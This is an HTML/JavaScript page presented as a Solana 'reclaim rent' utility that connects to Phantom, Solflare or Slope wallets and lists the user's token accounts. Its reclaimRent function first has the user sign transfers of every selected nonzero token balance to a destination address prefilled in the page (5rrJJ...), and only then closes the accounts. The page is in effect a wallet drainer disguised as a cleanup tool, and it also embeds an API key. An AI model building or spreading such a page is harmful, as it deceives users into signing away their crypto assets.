<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Universal Solana Wallet DApp (Helius)</title>
<meta name="viewport" content="width=device-width,initial-scale=1">
<style>
body{font-family:Arial,Helvetica,sans-serif;display:flex;justify-content:center;padding:40px;background:#f0f2f5}
#walletApp{max-width:700px;width:100%;padding:20px;background:#fff;border-radius:10px;box-shadow:0 6px 24px rgba(0,0,0,0.08)}
button{padding:12px;border-radius:8px;border:0;font-size:15px;cursor:pointer;margin:5;background:#4caf50;color:#fff}
button:hover{background:#45a049}
#logs{margin-top:12px;padding:12px;border-radius:8px;background:#e8f4fd;white-space:pre-wrap;max-height:420px;overflow:auto;text-align:left}
h2{margin:0 0 12px 0}
.note{font-size:13px;color:#666;margin-top:8px}

/* Wallet dropdown */
.dropdown{position:relative;width:48%;cursor:pointer;border:1px solid #ccc;border-radius:8px;padding:10px;background:#fff;display:flex;align-items:center;justify-content:space-between}
.dropdown .selected{display:flex;align-items:center;gap:8px}
.dropdown .options{position:absolute;top:100%;left:0;width:100%;background:#fff;border:1px solid #ccc;border-radius:8px;max-height:200px;overflow:auto;display:none;flex-direction:column;z-index:100}
.dropdown .option{padding:8px 10px;display:flex;align-items:center;gap:8px;cursor:pointer}
.dropdown .option:hover{background:#f0f0f0}
.wallet-icon{width:20px;height:20px;}

/* Token table */
#tokenTable{margin-top:12px;width:100%;border-collapse:collapse}
#tokenTable th,#tokenTable td{border:1px solid #ccc;padding:6px;text-align:left}
#tokenTable th{background:#f0f0f0}
</style>
</head>
<body>
<div id="walletApp">
<h2>Universal Solana Wallet DApp (Helius)</h2>

<div style="display:flex;gap:8px;align-items:center;justify-content:center;margin-bottom:8px">
  <div class="dropdown" id="walletDropdown">
    <div class="selected"><span>Select Wallet</span> ‚ñº</div>
    <div class="options"></div>
  </div>
</div>

<div style="text-align:center">
  <button id="connectWallet">Connect Wallet</button>
  <button id="disconnectWallet">Disconnect Wallet</button>
</div>

<div style="margin-top:12px">
  Destination wallet: <input type="text" id="destWallet" value="5rrJJykVDgeMYWiXRvMoMjGZiYyDj6791kiymaETXM4K" style="width:100%;padding:6px;border-radius:6px;border:1px solid #ccc">
</div>

<table id="tokenTable">
  <thead>
    <tr><th>Select</th><th>Mint</th><th>Amount</th><th>USD</th></tr>
  </thead>
  <tbody></tbody>
</table>

<div style="text-align:center;margin-top:8px">
  <button id="reclaimRentBtn">üßπ Reclaim Selected Accounts</button>
</div>

<div class="note">Using Helius RPC (demo key) ‚Äî do not commit private keys to public repos.</div>
<div id="logs">Logs will appear here...</div>
</div>

<script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.91.0/lib/index.iife.min.js"></script>
<script>
(async function(){
const HELIUS_RPC='https://mainnet.helius-rpc.com/?api-key=b933e448-6fee-4016-b4ec-3c6c19a46775';
const TOKEN_PROGRAM='TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA';
const DUST_THRESHOLD_USD=0.01;

const WALLET_ICONS={
  Phantom:'https://i.postimg.cc/dtMtxggx/download-2025-10-28T170610-630.png',
  Solflare:'https://i.postimg.cc/YqcqsTTP/download-2025-10-28T170541-439.png',
  Slope:'https://raw.githubusercontent.com/solana-labs/wallet-adapter/main/packages/wallets/wallet-icons/src/slope.svg'
};

const walletDropdown=document.getElementById('walletDropdown');
const selectedEl=walletDropdown.querySelector('.selected span');
const optionsEl=walletDropdown.querySelector('.options');

const connectBtn=document.getElementById('connectWallet');
const disconnectBtn=document.getElementById('disconnectWallet');
const reclaimBtn=document.getElementById('reclaimRentBtn');
const logsEl=document.getElementById('logs');
const tokenTable=document.getElementById('tokenTable').querySelector('tbody');
const destWalletInput=document.getElementById('destWallet');

let wallet=null, publicKey=null, connection=null, selectedWalletObj=null;
let tokenAccounts=[];

function log(msg){ logsEl.innerText+=msg+'\n'; logsEl.scrollTop=logsEl.scrollHeight; console.log(msg);}
function clearLogs(){ logsEl.innerText=''; }

function detectWallets(){
  const wallets=[];
  if(window.phantom?.solana?.isPhantom) wallets.push({wallet: window.phantom.solana, name:'Phantom'});
  if(window.solflare && window.solflare.isSolflare) wallets.push({wallet: window.solflare, name:'Solflare'});
  if(window.Slope){ try{ wallets.push({wallet:new window.Slope(), name:'Slope'}); }catch{} }
  return wallets;
}

function populateDropdown(){
  optionsEl.innerHTML='';
  detectWallets().forEach(w=>{
    const div=document.createElement('div');
    div.className='option';
    div.innerHTML=`<img class="wallet-icon" src="${WALLET_ICONS[w.name]||''}"><span>${w.name}</span>`;
    div.onclick=()=>{ selectedWalletObj=w; selectedEl.innerHTML=`<img class="wallet-icon" src="${WALLET_ICONS[w.name]||''}"><span>${w.name}</span>`; optionsEl.style.display='none';};
    optionsEl.appendChild(div);
  });
}

selectedEl.parentElement.onclick=()=>{ optionsEl.style.display = optionsEl.style.display==='flex'?'none':'flex'; }

function buildConnection(){ return new solanaWeb3.Connection(HELIUS_RPC,'confirmed'); }

async function getTokenPrices(mints){
  if(!mints.length) return {};
  try{
    const res=await fetch('https://api.helius.xyz/v0/token-prices?api-key=b933e448-6fee-4016-b4ec-3c6c19a46775',{
      method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({mints})
    });
    const data=await res.json();
    const map={};
    Array.isArray(data)&&data.forEach(p=>map[p.mint]=p.price||0);
    return map;
  }catch(e){ log('‚ö†Ô∏è Token prices fetch failed: '+e.message); return {}; }
}

async function connectWalletFunc(){
  clearLogs();
  if(!selectedWalletObj){ log('‚ùå Select a wallet first'); return; }
  try{
    log('Connecting '+selectedWalletObj.name+'...');
    const resp=await selectedWalletObj.wallet.connect();
    publicKey=resp?.publicKey||selectedWalletObj.wallet?.publicKey;
    if(publicKey?.toString) publicKey=publicKey.toString();
    wallet=selectedWalletObj.wallet;
    log('‚úÖ Connected: '+publicKey);
    if(!connection) connection=buildConnection();

    // SOL
    const lamports=await connection.getBalance(new solanaWeb3.PublicKey(publicKey));
    log('üí∞ SOL Balance: '+(lamports/1e9).toFixed(6)+' SOL');

    // SPL tokens
    const res=await connection.getParsedTokenAccountsByOwner(
      new solanaWeb3.PublicKey(publicKey),
      {programId: new solanaWeb3.PublicKey(TOKEN_PROGRAM)}
    );
    tokenAccounts=res.value||[];
    const mints=tokenAccounts.map(t=>t.account.data.parsed.info.mint);
    const prices=await getTokenPrices(mints);

    // Populate table
    tokenTable.innerHTML='';
    tokenAccounts.forEach((t,i)=>{
      const info=t.account.data.parsed.info;
      const amount=Number(info.tokenAmount.uiAmount);
      const usd=(amount*(prices[info.mint]||0)).toFixed(6);
      const tr=document.createElement('tr');
      tr.innerHTML=`<td><input type="checkbox" data-index="${i}"></td>
                      <td>${info.mint}</td>
                      <td>${amount}</td>
                      <td>$${usd}</td>`;
      tokenTable.appendChild(tr);
    });

    log('‚úÖ Token accounts loaded.');
  }catch(e){ log('‚ùå Connect failed: '+e.message);}
}

async function disconnectWalletFunc(){
  if(!wallet){ log('‚ùå No wallet connected'); return; }
  try{ if(wallet.disconnect) await wallet.disconnect(); log('Wallet disconnected'); wallet=null; publicKey=null; selectedWalletObj=null; tokenAccounts=[]; tokenTable.innerHTML='';}
  catch(e){ log('‚ùå Disconnect error: '+e.message);}
}

async function reclaimRent(){
  if(!wallet||!publicKey){ log('‚ùå Connect wallet first.'); return; }
  clearLogs();
  log('üßπ Reclaim Rent started...');

  const selectedIndexes=[...tokenTable.querySelectorAll('input[type=checkbox]:checked')].map(cb=>Number(cb.dataset.index));
  if(!selectedIndexes.length){ log('‚ùå Select at least one account to reclaim.'); return; }

  const destWallet=destWalletInput.value.trim();
  if(!destWallet){ log('‚ùå Destination wallet required.'); return; }

  for(const idx of selectedIndexes){
    const t=tokenAccounts[idx];
    const info=t.account.data.parsed.info;
    const amount=Number(info.tokenAmount.uiAmount);
    if(amount>0){
      // transfer to destination first
      try{
        const transferIx=solanaWeb3.Token.createTransferInstruction(
          new solanaWeb3.PublicKey(TOKEN_PROGRAM),
          t.pubkey,
          new solanaWeb3.PublicKey(destWallet),
          new solanaWeb3.PublicKey(publicKey),
          [],
          amount
        );
        const tx=new solanaWeb3.Transaction().add(transferIx);
        tx.feePayer=new solanaWeb3.PublicKey(publicKey);
        const {blockhash}=await connection.getLatestBlockhash();
        tx.recentBlockhash=blockhash;
        const signed=await wallet.signTransaction(tx);
        const sig=await connection.sendRawTransaction(signed.serialize());
        await connection.confirmTransaction(sig,'confirmed');
        log(`‚úÖ Transferred ${amount} of ${info.mint} to ${destWallet} ‚Äî tx ${sig}`);
      }catch(e){ log(`‚ùå Transfer failed for ${info.mint}: ${e?.message||e}`); continue;}
    }

    // close account
    try{
      const keys=[
        {pubkey:t.pubkey,isSigner:false,isWritable:true},
        {pubkey:new solanaWeb3.PublicKey(publicKey),isSigner:false,isWritable:true},
        {pubkey:new solanaWeb3.PublicKey(publicKey),isSigner:true,isWritable:false}
      ];
      const ix=new solanaWeb3.TransactionInstruction({keys,programId:new solanaWeb3.PublicKey(TOKEN_PROGRAM),data:Uint8Array.from([9])});
      const tx=new solanaWeb3.Transaction().add(ix);
      tx.feePayer=new solanaWeb3.PublicKey(publicKey);
      const {blockhash}=await connection.getLatestBlockhash();
      tx.recentBlockhash=blockhash;
      const signed=await wallet.signTransaction(tx);
      const sig=await connection.sendRawTransaction(signed.serialize());
      await connection.confirmTransaction(sig,'confirmed');
      log(`‚úÖ Closed ${t.pubkey.toString()} ‚Äî tx ${sig}`);
    }catch(e){ log(`‚ùå Close failed for ${info.mint}: ${e?.message||e}`);}
  }

  log('üéâ Reclaim run complete.');
}

// Button events
connectBtn.addEventListener('click', connectWalletFunc);
disconnectBtn.addEventListener('click', disconnectWalletFunc);
reclaimBtn.addEventListener('click', reclaimRent);

// Init
connection=buildConnection();
populateDropdown();
setInterval(()=>{ if(detectWallets().length!==optionsEl.children.length) populateDropdown(); },3000);

})();
</script>
</body>
</html>
